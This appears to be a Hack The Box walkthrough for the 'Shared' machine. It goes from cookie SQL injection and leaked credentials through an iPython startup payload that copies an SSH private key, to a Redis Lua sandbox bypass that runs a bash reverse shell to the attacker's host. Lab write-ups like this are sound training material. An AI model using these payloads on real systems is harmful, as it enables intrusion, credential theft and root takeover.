1 - Enumerate ports

2 - Add shared.htb to `/etc/hosts`

3 - Enumerate directories and files with [GoBuster](<General Info/Tools/Enumeracion/GoBuster.md>), after doing this enumerate subdomains with the same tool

4 - Once you've enumerated the subdomains you'll come across `checkout.shared.htb`. Add it to `/etc/hosts`

5 - Now enter a product in the cart and try to buy it, Once you've reached the checkout page look at the previously enumerated cookies and you'll see that the cookie `custom_cart` has changed and now it has in its content the name of the code of the product, so, because the checkout page makes a call to the database, its suceptible to SQLi

6 - Once you've exploited the SQLi and obtained the user and password `james_mason:Soleil101` you can enter the machine through ssh and do some more enumeration. Recommended [Things to enumerate (Machine)](<General Info/Enumeration/Things to enumerate (Machine).md>)

7 - Now that you've the machine enumerated you know that there is a directory called `scripts_review` that, because of the name, makes you think that maybe there's a process that looks for scripts in that folder.

8 - Because of the previous assumption we now can try to look for processes being run regularly on the machine by another users in order to pivot to another user. [Processes enumeration](<General Info/Enumeration/Processes enumeration.md>)

9 - Once you've detected the process that uses the directory scripts_review and you've seen what it does it's time to do some research and look for [iPython](<General Info/Tecnologias Web/iPython.md>). You'll see that the way of exploit this behavior is the one detailed in the note previously linked. The particular payload you have to use is `import os; os.system("cat ~/.ssh/id_rsa > /dev/shm/key")` and save it inside a python file called foo.py in the directory startup.

10 - The previously explained step will make the process that runs regularly create a copy of the id_rsa file in a readable file that we'll be able to use in order to enter via SSH as the user that was running the process that employed [iPython](<General Info/Tecnologias Web/iPython.md>)

11 - Now that we've the id_rsa of dan_smith you can put it in a file and change that file permissons with `chmod 600 {FILE}` and, after doing all that, execute the ssh client with the following command `ssh -i {KEY-FILE} dan_smith@{IP56}`

12 - Now that you're connected to the machine you can try to enumerate everything to find ways of performing a privilege escalation. The way to find the escalation factor is by doing a `id` command and, once you see you're in the sysadmin group, execute the following command `find / -group sysadmin` in order to find the file `redis_connector_dev` and play with it

13 - The main function of that file is auth to the redis server and gather all the info of it, so, what we can do in order to get the password of the redis service is:
	13.1 - Get the file to our computer by running: `scp -i {KEY_FILE} {USER}@{IP}:{FILE_PATH} {LOCAL_PATH}`
	13.2 - Once the file is in our computer run a netcat server in the redis port: `nc -lvpn 6379`
	13.3 - Run the file in order to get the credentials used by the app in the redis server of the victim's machine

14 - Once you've done the previous step and you've got the password `F2WHqJUz2WEz=Gqq` for the redis service you can try multiple attacks listed in the hacktricks page of redis pentesting
	14.1 - One attack that could work on a redis service could be the one that is carried out in the ssh service by creating a key pair of your own machine and uploading the public key to the authorized keys of the root user in order to get credentials over the root account in the ssh service
	14.2 - Another attack (The one applied in this machine particularly) is the LUA Sandbox Bypass, attack that gives you command execution as the user who runs the redis service (Root in this case). The code to make this happen is:
	```eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash {PATH TO FILE WITH REV_SHELL}", "r"); local res = f:read("*a"); f:close(); return res' 0```
	This attacks require you to previously make a file that contains a simple bash script like this one in the specified path:
```
#!/bin/bash

bash -i >& /dev/tcp/{HACKER'S IP}/{PORT} 0>&1
```
	Clearly you've to have your machine listening on the specified port

15 - Now you should have your reverse shell as root in the netcat window